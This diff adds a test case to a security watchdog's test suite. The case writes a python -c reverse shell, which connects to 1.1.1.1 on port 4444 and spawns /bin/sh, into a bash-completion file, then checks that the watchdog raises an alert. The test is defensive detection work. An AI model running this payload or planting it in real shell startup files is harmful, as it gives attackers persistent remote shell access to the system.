@@ -264,3 +264,19 @@ seed_benign() {
     run_wd
     cap | grep -q 'distinctive-attacker-completion'
 }
+
+@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on bash-completion surface)" {
+    # Sister to many other watchdog's python interpreter-rev-shell
+    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
+    # reach for python -c 'import socket,os,pty' to dodge shell-
+    # pattern detectors. Locks the python axis on the bash-
+    # completion per-interactive-bash-startup-trigger root/user-
+    # exec persistence surface (T1546.004 — completion files are
+    # sourced into every interactive bash session at startup).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/bash\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${HOOKD}/git-completion.bash"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
